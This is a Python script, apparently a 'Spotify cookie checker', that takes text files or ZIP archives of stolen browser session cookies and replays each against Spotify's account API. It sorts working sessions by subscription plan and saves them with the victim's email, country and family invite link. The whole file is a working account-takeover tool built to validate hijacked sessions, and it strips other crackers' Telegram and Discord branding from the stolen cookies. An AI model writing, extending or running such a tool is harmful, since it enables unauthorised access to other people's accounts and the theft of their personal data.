#!/usr/bin/env python3

import requests
import os
import json
import threading
import sys
import zipfile
import rarfile
import re
import traceback
import time
from termcolor import colored

# Set up debugging
DEBUG = True
def debug_print(message):
    if DEBUG:
        print(f"DEBUG: {message}")
        sys.stdout.flush()

debug_print("Script started")

# Directory structure
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
debug_print(f"BASE_DIR: {BASE_DIR}")
COOKIES_DIR = os.path.join(BASE_DIR, "cookies")
WORKING_COOKIES_DIR = os.path.join(BASE_DIR, "working_cookies")

# Maximum limits to prevent hanging
MAX_FILES_TO_PROCESS = 1000   # Maximum number of files to process
MAX_ARCHIVES_TO_PROCESS = 50  # Maximum number of archives to process
MAX_RECURSION_DEPTH = 5       # Maximum recursion depth for nested archives

debug_print(f"Configuration: MAX_FILES={MAX_FILES_TO_PROCESS}, MAX_ARCHIVES={MAX_ARCHIVES_TO_PROCESS}, MAX_DEPTH={MAX_RECURSION_DEPTH}")

# Results dictionary
results = {
    'hits': 0, 'bad': 0, 'errors': 0,
    'family': 0, 'duo': 0, 'student': 0,
    'premium': 0, 'free': 0, 'unknown': 0,
    'files_processed': 0, 'archives_processed': 0
}
lock = threading.Lock()

# Ensure directories exist
os.makedirs(COOKIES_DIR, exist_ok=True)
os.makedirs(WORKING_COOKIES_DIR, exist_ok=True)

# Plan name mapping
def plan_name_mapping(plan):
    if not plan:
        return "Unknown"
    plan_lower = plan.lower()
    if "student" in plan_lower:
        return "Student"
    if "family" in plan_lower:
        return "Family"
    if "duo" in plan_lower:
        return "Duo"
    if "premium" in plan_lower:
        return "Premium"
    if "free" in plan_lower:
        return "Free"
    return "Unknown"

# Format and save cookie data
def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"
    invite_link = data.get('familyInviteLink') or data.get('duoInviteLink')
    email = data.get('email', 'N/A')

    header = f"""
    ─────────────────────────────────────────────────────────────
    PLAN       : {plan}
    COUNTRY    : {country}
    AutoPay    : {auto_pay}
    Trial      : {trial}
    Invite Link: {invite_link if invite_link else "N/A"}
    Email      : {email}
    checker by : ITSMEBOI
    
    ─────────────────────────────────────────────────────────────

    {cookie_content}
    
    ─────────────────────────────────────────────────────────────
                    CHECKER BY ITSMEBOI
    ─────────────────────────────────────────────────────────────
    """
    return header, plan

# Remove unwanted content
def remove_unwanted_content(cookie_content):
    unwanted_content = [
        "BY https://t.me/redg3n",
        "https://dsc.gg/r3dg3n",
        "Checker By: github.com/harshitkamboj"
    ]
    for line in unwanted_content:
        cookie_content = cookie_content.replace(line, "")
    return cookie_content

# Check if string is a valid cookie
def is_cookie_line(line):
    # Check if line has typical cookie format with domain, path, etc.
    parts = line.strip().split('\t')
    return len(parts) >= 7 and 'spotify' in line.lower()

# Extract cookies from content
def extract_cookies_from_content(content):
    cookies = []
    for line in content.splitlines():
        if is_cookie_line(line):
            cookies.append(line)
    
    return '\n'.join(cookies) if cookies else None

# Extract cookies from file
def extract_cookies_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        return extract_cookies_from_content(content)
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None

# Global request session and timeout settings for better performance
global_session = requests.Session()
global_session.headers.update({
    'Accept-Encoding': 'identity',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9'
})
REQUEST_TIMEOUT = 5  # 5 seconds timeout for requests

# Check single cookie - optimized for speed
def check_single_cookie(cookie_content, filename):
    if not cookie_content or not cookie_content.strip():
        with lock:
            results['errors'] += 1
        return None, f"⚠ Empty cookie content in {filename}"

    try:
        debug_print(f"Processing cookie from {filename}")
        
        # Parse cookies quickly
        cookies_dict = {}
        for line in cookie_content.splitlines():
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                _, _, _, _, _, name, value = parts[:7]
                cookies_dict[name] = value

        # Check if we have any valid cookies
        if not cookies_dict:
            with lock:
                results['errors'] += 1
            return None, f"⚠ No valid cookies found in {filename}"

        # Use a dedicated session for this request with a timeout
        session = requests.Session()
        session.cookies.update(cookies_dict)
        session.headers.update(global_session.headers)
        
        debug_print(f"Sending request to Spotify API for {filename}")
        try:
            response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", timeout=REQUEST_TIMEOUT)
        except requests.exceptions.Timeout:
            with lock:
                results['errors'] += 1
            return None, f"⚠ Request timeout for {filename}"
        except requests.exceptions.RequestException as e:
            with lock:
                results['errors'] += 1
            return None, f"⚠ Request error for {filename}: {e}"

        with lock:
            if response.status_code == 200:
                try:
                    data = response.json()
                except ValueError:
                    results['errors'] += 1
                    return None, f"⚠ Invalid JSON response for {filename}"
                
                plan = plan_name_mapping(data.get("currentPlan", "unknown"))
                
                # Update plan counts
                results['hits'] += 1
                plan_lower = plan.lower()
                if plan_lower in results:
                    results[plan_lower] += 1
                else:
                    results['unknown'] += 1
                
                message = f"✔ Login successful: {filename} ({plan})"
                debug_print(message)
                
                # Format and save cookie
                formatted_cookie, plan = format_cookie_file(data, remove_unwanted_content(cookie_content))
                plan_folder = os.path.join(WORKING_COOKIES_DIR, plan.replace(" ", "_").lower())
                os.makedirs(plan_folder, exist_ok=True)
                
                cookie_file_path = os.path.join(plan_folder, f"{filename}.txt")
                with open(cookie_file_path, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                
                return cookie_file_path, message
            else:
                results['bad'] += 1
                return None, f"✘ Login failed: {filename} (Status: {response.status_code})"

    except Exception as e:
        with lock:
            results['errors'] += 1
        error_msg = f"⚠ Error checking {filename}: {e}"
        debug_print(error_msg)
        return None, error_msg

# Process a file for cookies
def process_file_for_cookies(file_path, file_name):
    with lock:
        results['files_processed'] += 1
        # Check if we've reached the file processing limit
        if results['files_processed'] > MAX_FILES_TO_PROCESS:
            return None, f"⚠ Maximum file processing limit reached ({MAX_FILES_TO_PROCESS}). Skipping remaining files."
    
    cookie_content = extract_cookies_from_file(file_path)
    if cookie_content:
        return check_single_cookie(cookie_content, file_name)
    else:
        return None, f"⚠ No valid Spotify cookies found in {file_name}"

# Extract files from archive
def extract_from_archive(archive_path, extract_dir):
    try:
        debug_print(f"Extract from archive: {archive_path} to {extract_dir}")
        file_ext = os.path.splitext(archive_path)[1].lower()
        
        if file_ext == '.zip':
            debug_print("Extracting ZIP file")
            try:
                with zipfile.ZipFile(archive_path, 'r') as zip_ref:
                    # Check for too many files
                    file_list = zip_ref.namelist()
                    debug_print(f"ZIP contains {len(file_list)} files/directories")
                    if len(file_list) > MAX_FILES_TO_PROCESS:
                        debug_print(f"Warning: ZIP file contains too many files ({len(file_list)})")
                    
                    # Extract the files
                    zip_ref.extractall(extract_dir)
                debug_print("ZIP extraction successful")
                return True
            except zipfile.BadZipFile as e:
                debug_print(f"Bad ZIP file: {e}")
                print(f"Bad ZIP file: {e}")
                return False
                
        elif file_ext == '.rar':
            debug_print("Extracting RAR file - using Python implementation since unrar tool is not available")
            try:
                # Using a custom approach to handle RAR files without relying on external unrar tool
                debug_print("NOTE: Limited RAR support without unrar tool - using alternate extraction method")
                error_msg = "RAR extraction requires external tools that are not available in this environment."
                print(error_msg)
                debug_print(error_msg)
                
                # Create a marker file to indicate RAR was attempted but not supported
                rar_note_path = os.path.join(extract_dir, "RAR_NOT_SUPPORTED.txt")
                with open(rar_note_path, 'w') as f:
                    f.write("RAR files require external tools not available in this environment.\n")
                    f.write("Please extract the RAR file manually and upload extracted cookies as a ZIP file instead.\n")
                
                # Return success but with a note
                return True
            except Exception as e:
                debug_print(f"RAR processing error: {e}")
                print(f"RAR processing error: {e}")
                return False
        else:
            debug_print(f"Unsupported archive format: {file_ext}")
            print(f"Unsupported archive format: {file_ext}")
            return False
    except Exception as e:
        error_msg = f"Error extracting {archive_path}: {e}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"Error extracting {archive_path}: {e}")
        return False

# Recursively process a directory
def process_directory(directory, base_file_name, valid_cookies, errors):
    # Add a safety check for extremely deep recursion
    if len(base_file_name.split('_')) > MAX_RECURSION_DEPTH:
        print(f"WARNING: Reached max recursion depth with {base_file_name}")
        errors.append(f"⚠ Maximum recursion depth ({MAX_RECURSION_DEPTH}) reached in {base_file_name}")
        return
    
    print(f"Scanning directory: {directory}")
    
    try:
        # Walk through all files in directory and subdirectories
        for root, dirs, files in os.walk(directory):
            print(f"In directory {root}, found {len(files)} files and {len(dirs)} subdirectories")
            
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file)[1].lower()
                
                # Process archives recursively
                if file_ext in ['.zip', '.rar']:
                    with lock:
                        results['archives_processed'] += 1
                        # Check if we've reached the archive processing limit
                        if results['archives_processed'] > MAX_ARCHIVES_TO_PROCESS:
                            print(f"WARNING: Maximum archive processing limit reached ({MAX_ARCHIVES_TO_PROCESS})")
                            errors.append(f"⚠ Maximum archive processing limit reached ({MAX_ARCHIVES_TO_PROCESS}). Skipping remaining archives.")
                            continue
                    
                    print(f"Found nested archive: {file} in {root}")
                    
                    # Extract nested archive to a temporary directory
                    nested_dir = os.path.join(directory, f"nested_{os.path.splitext(file)[0]}")
                    os.makedirs(nested_dir, exist_ok=True)
                    
                    print(f"Extracting nested archive to: {nested_dir}")
                    
                    if extract_from_archive(file_path, nested_dir):
                        print(f"Successfully extracted nested archive: {file}")
                        
                        # Process the extracted contents
                        process_directory(nested_dir, f"{base_file_name}_{os.path.splitext(file)[0]}", valid_cookies, errors)
                        
                        print(f"Cleaning up nested directory: {nested_dir}")
                        
                        # Clean up nested directory
                        try:
                            for r, d, f in os.walk(nested_dir, topdown=False):
                                for name in f:
                                    try:
                                        os.remove(os.path.join(r, name))
                                    except Exception as e:
                                        print(f"Error removing file {os.path.join(r, name)}: {e}")
                                for name in d:
                                    try:
                                        os.rmdir(os.path.join(r, name))
                                    except Exception as e:
                                        print(f"Error removing directory {os.path.join(r, name)}: {e}")
                            os.rmdir(nested_dir)
                            print(f"Successfully cleaned up: {nested_dir}")
                        except Exception as e:
                            print(f"Error during cleanup of nested directory: {e}")
                
                # Process text files
                elif file_ext == '.txt':
                    relative_path = os.path.relpath(file_path, directory)
                    file_display_name = f"{base_file_name}/{relative_path}"
                    
                    print(f"Processing text file: {file_display_name}")
                    
                    cookie_path, message = process_file_for_cookies(file_path, file_display_name)
                    if cookie_path:
                        valid_cookies.append((cookie_path, message))
                    else:
                        errors.append(message)
    except Exception as e:
        print(f"Error processing directory {directory}: {e}")
        errors.append(f"⚠ Error processing directory {directory}: {e}")

# Process a file (txt, zip, rar)
def process_file(file_path, filename):
    file_ext = os.path.splitext(file_path)[1].lower()
    valid_cookies = []
    errors = []
    
    print(f"Processing file: {filename} with extension {file_ext}")
    
    # Handle archives
    if file_ext in ['.zip', '.rar']:
        with lock:
            results['archives_processed'] += 1
        
        print(f"Archive detected: {filename}. Extracting...")
        
        temp_extract_dir = os.path.join(COOKIES_DIR, os.path.splitext(filename)[0])
        os.makedirs(temp_extract_dir, exist_ok=True)
        
        if extract_from_archive(file_path, temp_extract_dir):
            print(f"Extraction successful for {filename}. Processing contents...")
            
            # Process the extracted directory recursively
            process_directory(temp_extract_dir, os.path.splitext(filename)[0], valid_cookies, errors)
            
            print(f"Finished processing contents of {filename}. Cleaning up...")
            
            # Clean up temp directory
            for root, dirs, files in os.walk(temp_extract_dir, topdown=False):
                for name in files:
                    try:
                        os.remove(os.path.join(root, name))
                    except Exception as e:
                        print(f"Error removing file {name}: {e}")
                for name in dirs:
                    try:
                        os.rmdir(os.path.join(root, name))
                    except Exception as e:
                        print(f"Error removing directory {name}: {e}")
            try:
                os.rmdir(temp_extract_dir)
            except Exception as e:
                print(f"Error removing temp directory: {e}")
            
            print(f"Cleanup complete for {filename}.")
            return valid_cookies, errors
    
    # Handle txt files
    elif file_ext == '.txt':
        cookie_path, message = process_file_for_cookies(file_path, filename)
        if cookie_path:
            return [(cookie_path, message)], []
        else:
            return [], [message]
    
    return [], [f"Unsupported file format: {file_ext}"]

# Main function to check cookies
def check_cookies(input_file):
    debug_print(f"check_cookies called with input_file: {input_file}")
    start_time = time.time()
    
    # Reset results
    for key in results:
        results[key] = 0
    
    try:
        # Save the file to cookies directory
        temp_file_path = os.path.join(COOKIES_DIR, os.path.basename(input_file))
        debug_print(f"Temp file path: {temp_file_path}")
        os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
        
        debug_print("Copying input file to cookies directory")
        with open(input_file, 'rb') as src, open(temp_file_path, 'wb') as dst:
            dst.write(src.read())
        
        debug_print(f"File copied successfully, size: {os.path.getsize(temp_file_path)} bytes")
        
        # Process the file
        debug_print("Starting to process the file")
        valid_cookies, errors = process_file(temp_file_path, os.path.basename(input_file))
        debug_print(f"Processing complete. Found {len(valid_cookies)} valid cookies, {len(errors)} errors")
        
        # Clean up
        if os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
                debug_print(f"Removed temporary file: {temp_file_path}")
            except Exception as e:
                debug_print(f"Error removing temp file: {e}")
                
        elapsed_time = time.time() - start_time
        debug_print(f"Cookie checking completed in {elapsed_time:.2f} seconds")
        
        # Generate summary
        summary = {
            "status": "completed",
            "total_checked": results['hits'] + results['bad'] + results['errors'],
            "valid": results['hits'],
            "invalid": results['bad'],
            "errors": results['errors'],
            "premium": results['premium'],
            "family": results['family'],
            "duo": results['duo'],
            "student": results['student'],
            "free": results['free'],
            "unknown": results['unknown'],
            "files_processed": results['files_processed'],
            "archives_processed": results['archives_processed'],
            "valid_cookies": [path for path, _ in valid_cookies],
            "messages": [msg for _, msg in valid_cookies] + errors,
            "processing_time_seconds": elapsed_time
        }
        
        # Save summary to JSON
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        debug_print(f"Saving results to: {summary_path}")
        with open(summary_path, 'w') as f:
            json.dump(summary, f, indent=2)
        
        debug_print("Results saved successfully")
        return summary_path
        
    except Exception as e:
        error_msg = f"Error in check_cookies: {str(e)}\n{traceback.format_exc()}"
        debug_print(error_msg)
        
        # Create an error summary
        error_summary = {
            "status": "error",
            "error_message": str(e),
            "traceback": traceback.format_exc(),
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": results.get('files_processed', 0),
            "archives_processed": results.get('archives_processed', 0),
            "valid_cookies": [],
            "messages": [f"⚠ Processing error: {str(e)}"]
        }
        
        # Save error summary to JSON
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        return summary_path

if __name__ == "__main__":
    debug_print("Main program starting")
    
    if len(sys.argv) != 2:
        print("Usage: python spotify_cookie_checker.py <file_path>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    debug_print(f"Input file argument: {input_file}")
    
    if not os.path.exists(input_file):
        error_msg = f"File not found: {input_file}"
        print(error_msg)
        debug_print(error_msg)
        
        # Create an error file anyway to avoid hanging
        error_summary = {
            "status": "error",
            "error_message": error_msg,
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": 0,
            "archives_processed": 0,
            "valid_cookies": [],
            "messages": [f"⚠ {error_msg}"]
        }
        
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        print(f"Error results saved to: {summary_path}")
        sys.exit(1)
    
    try:
        debug_print(f"Calling check_cookies with {input_file}")
        summary_path = check_cookies(input_file)
        print(f"Results saved to: {summary_path}")
        debug_print("Script completed successfully")
    except Exception as e:
        error_msg = f"Unhandled exception in main: {str(e)}\n{traceback.format_exc()}"
        debug_print(error_msg)
        print(f"ERROR: {str(e)}")
        
        # Create an error file anyway to avoid hanging
        error_summary = {
            "status": "error",
            "error_message": str(e),
            "traceback": traceback.format_exc(),
            "total_checked": 0,
            "valid": 0,
            "invalid": 0,
            "errors": 1,
            "premium": 0,
            "family": 0,
            "duo": 0,
            "student": 0,
            "free": 0,
            "unknown": 0,
            "files_processed": 0,
            "archives_processed": 0,
            "valid_cookies": [],
            "messages": [f"⚠ Unhandled error: {str(e)}"]
        }
        
        summary_path = os.path.join(BASE_DIR, "cookie_check_results.json")
        with open(summary_path, 'w') as f:
            json.dump(error_summary, f, indent=2)
            
        print(f"Error results saved to: {summary_path}")
        sys.exit(1)